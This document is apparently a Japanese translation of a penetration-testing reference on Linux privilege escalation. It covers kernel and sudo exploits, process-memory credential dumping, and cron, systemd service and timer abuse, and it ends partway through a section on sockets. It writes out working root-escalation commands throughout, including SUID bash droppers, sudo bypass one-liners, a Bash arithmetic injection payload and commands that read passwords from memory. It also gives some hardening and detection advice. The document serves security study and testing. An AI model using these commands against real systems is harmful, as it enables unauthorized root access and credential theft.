# Linux Privilege Escalation

より広範な背景情報や過去の enumeration ワークフローについては、references に記載されている g0tmi1k、Payatu、SANS、LPE Workshop、Linux-Privilege-Escalation、linux-private-i を比較してください。<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## System Information

### OS 情報

まず、実行中の OS に関する情報を集めてみましょう。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

`PATH` 変数内のいずれかのフォルダに**書き込み権限がある場合、**一部のライブラリやバイナリを hijack できる可能性があります。
```bash
echo $PATH
```
### 環境情報

環境変数に興味深い情報、パスワード、または API keys はありますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

カーネルのバージョンを確認し、権限昇格に利用できる exploit があるか確認します。
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
脆弱な kernel の一覧と、いくつかの **compiled exploits** は、こちらで確認できます: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) および [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)。<sup>[[12]](#references)</sup>\
その他の **compiled exploits** を確認できるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries)、[https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのサイトから脆弱な kernel のバージョンをすべて抽出するには、次のように実行します:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploits の検索に役立つツール:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（被害ホスト上で実行。kernel 2.x の exploit のみをチェック）

常に **Google で kernel version を検索**してください。kernel version が何らかの kernel exploit に記載されている場合があり、その exploit が有効であることを確認できます。

追加の kernel exploitation techniques:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo バージョン

以下に示されている脆弱な sudo バージョンに基づくと：
```bash
searchsploit sudo
```
この grep を使用して、sudo のバージョンに脆弱性があるか確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

1.9.17p1 より前の Sudo バージョン（**1.9.14 - 1.9.17 < 1.9.17p1**）では、`/etc/nsswitch.conf` ファイルがユーザー管理下のディレクトリから使用される場合、権限のないローカルユーザーが sudo の `--chroot` オプションを介して root に権限昇格できます。<sup>[[28]](#references)[[29]](#references)</sup>

この [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) を exploit するための [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) があります。exploit を実行する前に、使用している `sudo` のバージョンが vulnerable であり、`chroot` feature をサポートしていることを確認してください。

詳細については、元の [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) を参照してください。<sup>[[28]](#references)</sup>

### Sudo host-based rules bypass (CVE-2025-32462)

1.9.17p1 より前の Sudo（報告されている影響範囲: **1.8.8–1.9.17**）では、`sudo -h <host>` で指定された **user-supplied hostname** を使用して host-based sudoers rules を評価し、**real hostname** を使用しない場合があります。sudoers が別の host でより広範な権限を許可している場合、その host をローカルで **spoof** できます。<sup>[[29]](#references)</sup>

要件:
- Vulnerable な sudo version
- Host-specific な sudoers rules（host が現在の hostname と `ALL` のいずれでもない）

sudoers pattern の例:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
許可されたホストを spoofing して exploit:
```bash
sudo -h devbox id
sudo -h devbox -i
```
偽装した名前の名前解決がブロックされる場合は、`/etc/hosts` に追加するか、DNS lookupを回避するために、ログやconfigsにすでに存在するhostnameを使用します。

#### sudo < v1.8.28

@​sickrovより
```
sudo -u#-1 /bin/bash
```
### Dmesg 署名検証に失敗しました

この脆弱性を悪用する方法の**例**については、**HTB の smasher2 box**を確認してください。
```bash
dmesg 2>/dev/null | grep "signature"
```
### さらに system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 考えられる防御策の列挙

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

コンテナ内にいる場合は、まず以下の container-security セクションを確認し、その後 runtime 固有の abuse ページに移ってください。


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Drives

**何がどこに、なぜ mount および unmount されているか**を確認します。何かが unmount されている場合は、それを mount して private な情報を確認できる可能性があります。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 便利なソフトウェア

有用なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**コンパイラがインストールされているか**確認します。これは、kernel exploitを使用する必要がある場合に役立ちます。使用するマシン（または類似したマシン）上でコンパイルすることが推奨されるためです。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### インストール済みの脆弱なソフトウェア

**インストール済みパッケージとサービスのバージョン**を確認します。例えば、古い Nagios のバージョンがあり、それを悪用して privilege escalation が可能な場合があります…\
より疑わしいインストール済みソフトウェアのバージョンは、手動で確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _これらのコマンドでは、ほとんど役に立たない大量の情報が表示されるため、OpenVASなどのツールを使用して、インストールされているソフトウェアのバージョンに既知のexploitに対する脆弱性がないか確認することが推奨されます_

## プロセス

実行されている**プロセス**を確認し、いずれかのプロセスが**本来よりも多くの権限**を持っていないか確認します（rootによって実行されているtomcatなど）。
```bash
ps aux
ps -ef
top -n 1
```
常に[**electron/cef/chromium debuggers**が実行中でないか確認し、権限昇格に悪用できる可能性があります](../../software-information/electron-cef-chromium-debugger-abuse.md)。**Linpeas**は、プロセスのコマンドライン内にある`--inspect`パラメータを確認して、これらを検出します。\
また、**プロセスのバイナリに対する自分の権限も確認してください**。誰かのバイナリを上書きできる可能性があります。

### ユーザー間の親子チェーン

**親プロセスとは異なるユーザー**で実行されている子プロセスは、必ずしも悪意があるとは限りませんが、有用な**triage signal**です。想定される遷移もあります（`root`がservice userを起動する、login managerがsession processを作成するなど）が、通常とは異なるチェーンから、wrapper、debug helper、persistence、またはruntimeの信頼境界の弱さが明らかになる場合があります。

簡単な確認方法:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
予想外の chain を見つけた場合は、親の command line と、その動作に影響を与えるすべてのファイル（`config`、`EnvironmentFile`、helper scripts、working directory、書き込み可能な arguments）を調査してください。実際の privesc path では、child 自体は書き込み可能でなくても、**parent-controlled config** または helper chain が書き込み可能でした。

### Deleted executables and deleted-open files

Runtime artifacts は、**削除後も**アクセスできる場合があります。これは privilege escalation と、すでに機密ファイルを open している process から evidence を復元する際の両方に役立ちます。

Deleted executables を確認します：
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
`/proc/<PID>/exe` が `(deleted)` を指している場合、そのプロセスはメモリ上の古いバイナリイメージを引き続き実行しています。これは調査すべき強い兆候です。理由は次のとおりです。

- 削除された実行ファイルに、興味深い文字列や認証情報が含まれている可能性がある
- 実行中のプロセスが、引き続き有用なファイルディスクリプタを公開している可能性がある
- 削除された特権バイナリは、最近の改ざんや痕跡消去の試みを示している可能性がある

削除済みで開かれているファイルをグローバルに収集します：
```bash
lsof +L1
```
興味深い descriptor を見つけたら、直接取得します:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
これは、プロセスが削除済みの secret、script、database export、または flag file を開いたままの場合に、特に有用です。

### プロセス監視

[**pspy**](https://github.com/DominicBreuker/pspy) などのツールを使用して、プロセスを監視できます。これは、頻繁に実行される脆弱なプロセスや、特定の要件が満たされたときに実行されるプロセスを特定するのに非常に役立ちます。

### プロセスメモリ

サーバー上の一部のサービスは、**メモリ内にcredentialsをclear textで保存**します。\
通常、他のユーザーに属するプロセスのメモリを読み取るには **root privileges** が必要です。そのため、これは通常、すでにrootであり、さらに多くのcredentialsを発見したい場合に有用です。\
ただし、**regular userとして、自分が所有するプロセスのメモリは読み取れる**ことを覚えておいてください。

> [!WARNING]
> 現在、多くのマシンではデフォルトで **ptraceが許可されていない**ため、unprivileged userに属する他のプロセスをdumpできません。
>
> ファイル _**/proc/sys/kernel/yama/ptrace_scope**_ は、ptraceのアクセス可能性を制御します。
>
> - **kernel.yama.ptrace_scope = 0**: 同じuidである限り、すべてのプロセスをdebugできます。これはptracingが機能していた従来の方法です。
> - **kernel.yama.ptrace_scope = 1**: parent processのみdebugできます。
> - **kernel.yama.ptrace_scope = 2**: CAP_SYS_PTRACE capabilityが必要なため、adminのみptraceを使用できます。
> - **kernel.yama.ptrace_scope = 3**: ptraceでtraceできるプロセスはありません。一度設定すると、再びptracingを有効にするにはrebootが必要です。

#### GDB

例えばFTP serviceのメモリにアクセスできる場合、Heapを取得して、そのcredentialsを検索できます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB スクリプト
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

特定のプロセスIDに対して、**maps はそのプロセスの仮想アドレス空間内でメモリがどのようにマッピングされているか**を示し、**各マッピング領域の権限**も表示します。**mem** pseudo file は**プロセスのメモリ自体を公開します**。**maps** file から、どの**メモリ領域が読み取り可能か**と、そのオフセットがわかります。この情報を使用して、**mem file 内を seek し、読み取り可能なすべての領域を** file に dump します。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの**物理**メモリへのアクセスを提供します。仮想メモリではありません。カーネルの仮想アドレス空間には /dev/kmem を使用してアクセスできます。\
通常、`/dev/mem` は **root** と **kmem** グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### Linux 用 ProcDump

ProcDump は、Windows 用 Sysinternals ツールスイートに含まれる従来の ProcDump ツールを Linux 向けに再構築したものです。[https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) から入手できます。
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

プロセスのメモリをダンプするには、次を使用できます。

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root 要件を手動で削除し、自分が所有するプロセスをダンプできます
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) の Script A.5 (root が必要)

### プロセスメモリからの認証情報

#### 手動での例

authenticator プロセスが実行中であることがわかった場合：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
プロセスをdumpし（プロセスのメモリをdumpするさまざまな方法については前のセクションを参照）、メモリ内のcredentialsを検索できます：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

このツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、**メモリから平文の認証情報を盗み取り**、一部の**よく知られたファイル**からも取得します。正常に動作させるには root 権限が必要です。

| 機能                                             | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM パスワード（Kali Desktop、Debian Desktop）    | gdm-password         |
| Gnome Keyring（Ubuntu Desktop、ArchLinux Desktop） | gnome-keyring-daemon |
| LightDM（Ubuntu Desktop）                         | lightdm              |
| VSFTPd（アクティブな FTP 接続）                   | vsftpd               |
| Apache2（アクティブな HTTP Basic Auth セッション） | apache2              |
| OpenSSH（アクティブな SSH セッション - Sudo の使用） | sshd:                |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## スケジュール済み/Cron ジョブ

### root として実行される Crontab UI (alseambusher) – Web ベースの scheduler privesc

Web の「Crontab UI」パネル（alseambusher/crontab-ui）が root として実行され、loopback にのみ bind されている場合でも、SSH のローカルポートフォワーディング経由でアクセスし、privileged job を作成して escalation できます。<sup>[[1]](#references)[[4]](#references)</sup>

典型的な chain
- loopback のみに bind されたポート（例: 127.0.0.1:8000）と Basic-Auth realm を `ss -ntlp` / `curl -v localhost:8000` で発見する
- 運用上の artifact から credentials を探す:
- `zip -P <password>` を使用する backups/scripts
- `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."` を公開している systemd unit
- tunnel を作成して login する:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 高権限のジョブを作成してすぐに実行する（SUID shellを配置する）:
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用する:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI を root として実行せず、専用ユーザーと最小限の権限で制限する
- localhost に bind し、さらに firewall/VPN でアクセスを制限する。パスワードを使い回さない
- unit files に secrets を埋め込まず、secret stores または root のみが読み取れる EnvironmentFile を使用する
- オンデマンドの job 実行に対する audit/logging を有効にする

スケジュールされた job に脆弱性がないか確認する。root によって実行される script を悪用できる可能性がある（wildcard vuln？ root が使用するファイルを変更できるか？ symlinks を使えるか？ root が使用するディレクトリ内に特定のファイルを作成できるか？）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
`run-parts` が使用されている場合、実際に実行される名前を確認します：
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
これは false positives を回避します。書き込み可能な periodic directory は、payload のファイル名がローカルの `run-parts` ルールに一致する場合にのみ役立ちます。

### Cron path

例えば、_ /etc/crontab_ 内には PATH が定義されています: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

（_ユーザー "user" が /home/user に対する書き込み権限を持っていることに注目してください_）

この crontab 内で、root user が path を設定せずにコマンドまたは script を実行しようとした場合。例: _\* \* \* \* root overwrite.sh_\
次の方法で root shell を取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### ワイルドカードを使用する Cron (Wildcard Injection)

root によって実行される script の command 内に “**\***” が含まれている場合、これを exploit して予期しないこと（privesc など）を引き起こせる可能性があります。例:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**wildcard の前に** _**/some/path/\***_ **のような path がある場合、脆弱ではありません（**_**./\***_ **でさえ脆弱ではありません）。**

wildcard exploitation のその他の tricks については、次のページを参照してください。


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### cron log parser における Bash arithmetic expansion injection

Bash は、((...))、$((...))、および let で arithmetic evaluation を行う前に、parameter expansion と command substitution を実行します。root cron/parser が信頼できない log field を読み取り、それを arithmetic context に渡す場合、attacker は command substitution $(...) を injection でき、cron の実行時に root として実行されます。<sup>[[22]](#references)</sup>

- 動作する理由: Bash では、expansion は次の順序で行われます: parameter/variable expansion、command substitution、arithmetic expansion、そして word splitting と pathname expansion。したがって、`$(/bin/bash -c 'id > /tmp/pwn')0` のような value は最初に substitution されて command が実行され、その後、残った numeric な `0` が arithmetic に使用されるため、script は error なしで続行されます。

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: parsed log に attacker-controlled text を書き込み、numeric に見える field に command substitution を含め、digit で終わるようにします。arithmetic が有効なままになるよう、command が stdout に出力しないようにするか、redirect してください。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting と symlink

**root が実行する cron script を変更できる場合、**shell を簡単に取得できます。
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
rootによって実行される **完全なアクセス権を持つディレクトリを使用するスクリプト** であれば、そのフォルダを削除し、**自分が制御するスクリプトを提供する別のフォルダへのシンボリックリンクを作成する** と役立つ場合があります。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink の検証とより安全なファイル処理

特権スクリプトや特権バイナリがパスによってファイルを読み書きする場合は、リンクの処理方法を確認します。

- `stat()` は symlink をたどり、対象のメタデータを返します。
- `lstat()` はリンク自体のメタデータを返します。
- `readlink -f` と `namei -l` は最終的な対象を解決し、各パスコンポーネントの権限を表示するのに役立ちます。
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
For defenders/developers、symlink tricks に対するより安全なパターンには、以下があります。

- `O_EXCL` with `O_CREAT`: パスがすでに存在する場合は失敗する（攻撃者が事前に作成したリンクやファイルをブロック）。
- `openat()`: 信頼できるディレクトリのファイルディスクリプタを基準に操作する。
- `mkstemp()`: secure permissions を使用して一時ファイルをアトミックに作成する。

### Custom-signed cron binaries with writable payloads
Blue teams は、カスタム ELF セクションをダンプし、root として実行する前に vendor string を grep することで、cron-driven binaries に「署名」することがあります。そのバイナリが group-writable（例: `root:devs 770` が所有する `/opt/AV/periodic-checks/monitor`）で、署名素材を leak できる場合、セクションを偽造して cron task を hijack できます:<sup>[[2]](#references)</sup>

1. `pspy` を使用して verification flow を取得します。Era では、root が `objcopy --dump-section .text_sig=text_sig_section.bin monitor` を実行し、その後に `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` を実行してから、ファイルを実行していました。
2. leak した key/config（`signing.zip` 内）を使用して、想定される certificate を再作成します。
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. malicious replacement（例: SUID bash を配置する、SSH key を追加する）を build し、grep が通過するように certificate を `.text_sig` に埋め込みます。
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. execute bits を保持したまま、scheduled binary を overwrite します。
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 次の cron run を待ちます。単純な signature check が成功すると、payload が root として実行されます。

### Frequent cron jobs

1、2、5 分ごとに実行されている processes を検索するため、processes を monitor できます。これを利用して privileges を escalate できる可能性があります。

たとえば、**1 分間、0.1 秒ごとに monitor**し、**実行回数の少ない commands 順に並べ**、最も多く実行された commands を削除するには、次のようにします。
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**You can also use** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（これは開始されるすべてのプロセスを監視して一覧表示します）。

### attacker-set mode bits を保持する root backups（pg_basebackup）

root-owned cron が、書き込み可能なデータベースディレクトリに対して `pg_basebackup`（または再帰的なコピー）を実行する場合、**SUID/SGID binary** を配置できます。その binary は、同じ mode bits のまま **root:root** としてバックアップ出力先に再コピーされます。<sup>[[26]](#references)</sup>

Typical discovery flow（low-priv DB user として）:
- `pspy` を使用して、毎分 `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` のようなコマンドを呼び出す root cron を見つけます。
- source cluster（例: `/var/lib/postgresql/14/main`）に自分が書き込み可能であり、job 実行後に destination（`/opt/backups/current`）が root 所有になることを確認します。

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
これは、`pg_basebackup` が cluster のコピー時にファイルモードビットを保持するためです。root によって実行されると、宛先ファイルは **root ownership + attacker-chosen SUID/SGID** を継承します。権限を保持し、実行可能な場所に書き込む同様の privileged backup/copy routine は、いずれも脆弱です。

### 不可視の cron jobs

**コメントの後に改行文字を付けずに carriage return を置く**ことで、cron job を作成できます。その cron job は動作します。例（carriage return 文字に注意してください）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
この種のステルスな侵入を検出するには、制御文字を表示できるツールで cron ファイルを調査します:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## サービス

### 書き込み可能な _.service_ ファイル

任意の `.service` ファイルに書き込み可能か確認してください。可能であれば、サービスが**開始**、**再起動**、または**停止**されたときに**backdoorを実行**するように**変更できます**（マシンが再起動されるまで待つ必要がある場合があります）。\
例えば、**`ExecStart=/tmp/script.sh`** を使用して、.service ファイル内にbackdoorを作成します

### 書き込み可能なサービスバイナリ

サービスによって実行されるバイナリへの**書き込み権限がある場合**、それらをbackdoor用に変更できます。これにより、サービスが再実行されたときにbackdoorが実行されます。

### systemd PATH - 相対パス

以下を使用して、**systemd** が使用するPATHを確認できます。
```bash
systemctl show-environment
```
パス内のいずれかのフォルダに**書き込み**できる場合、**権限昇格**できる可能性があります。次のような service configuration ファイルで使用されている**相対パス**を検索する必要があります。
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、書き込み可能な systemd PATH フォルダー内に、相対パスのバイナリと**同じ名前**の**実行可能ファイル**を作成します。サービスが脆弱なアクション（**Start**、**Stop**、**Reload**）の実行を要求されると、**backdoor が実行されます**（通常、権限のないユーザーはサービスを起動・停止できませんが、`sudo -l` を使用できるか確認してください）。

**サービスについては `man systemd.service` で詳しく学べます。**

## **タイマー**

**タイマー**は、名前が `**.timer**` で終わる systemd unit ファイルで、`**.service**` ファイルまたはイベントを制御します。**タイマー**は cron の代替として使用できます。カレンダー時刻イベントと単調時刻イベントを組み込みでサポートしており、非同期で実行できます。

次のコマンドで、すべてのタイマーを列挙できます。
```bash
systemctl list-timers --all
```
### 書き込み可能な timer

timer を変更できる場合、systemd.unit のいずれかのエンティティ（`.service` や `.target` など）を実行させることができます。
```bash
Unit=backdoor.service
```
ドキュメントでは、Unit について次のように説明されています。

> この timer の経過時に activate する Unit。引数は Unit 名で、サフィックス ".timer" は付けません。指定しない場合、この値は timer unit と同じ名前（サフィックスを除く）の service がデフォルトになります。（上記を参照してください。）activate される Unit 名と timer unit の Unit 名は、サフィックスを除いて同じ名前にすることが推奨されます。

したがって、この権限を悪用するには、次のことが必要です。

- **書き込み可能な binary を実行している** systemd unit（`.service` など）を見つける
- **相対パスを実行しており**、その **systemd PATH** に対して **書き込み権限**がある systemd unit を見つける（その executable になりすますため）

**`man systemd.timer` で timer の詳細を確認できます。**

### **タイマーの有効化**

timer を有効化するには root 権限が必要です。次を実行します。
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
`**timer**` は、`/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` にシンボリックリンクを作成することで **activated** されます。

## Sockets

Unix Domain Sockets (UDS) は、client-server モデル内で同一または異なるマシン上の **process communication** を可能にします。コンピューター間通信には標準の Unix descriptor files を使用し、`.socket` files を通じて設定されます。<sup>[[14]](#references)</sup>

Sockets は `.socket` files を使用して設定できます。

**`man systemd.socket` で sockets の詳細を確認できます。** このファイルでは、いくつかの興味深いパラメーターを設定できます。

- `ListenStream`、`ListenDatagram`、`ListenSequentialPacket`、`ListenFIFO`、`ListenSpecial`、`ListenNetlink`、`ListenMessageQueue`、`ListenUSBFunction`: これらのオプションはそれぞれ異なりますが、socket が **どこで listen するかを示す** ために使用されます（AF_UNIX socket file の path、listen する IPv4/6 および/または port number など）。
- `Accept`: boolean 引数を受け取ります。**true** の場合、**incoming connection ごとに service instance が spawn され**、その connection socket のみが渡されます。**false** の場合、すべての listening sockets 自体が **started service unit に渡され**、すべての connections に対して 1 つの service unit のみが spawn されます。この値は datagram sockets と FIFOs では無視され、これらでは 1 つの service unit が常にすべての incoming traffic を処理します。**デフォルトは false** です。パフォーマンス上の理由から、新しい daemons は `Accept=no` に適した方法でのみ作成することが推奨されます。
- `ExecStartPre`、`ExecStartPost`: 1 つ以上の command lines を受け取り、それぞれ listening **sockets**/FIFOs が **created** および bind される **前** または **後** に **executed** されます。command line の最初の token は absolute filename でなければならず、その後に process の arguments が続きます。
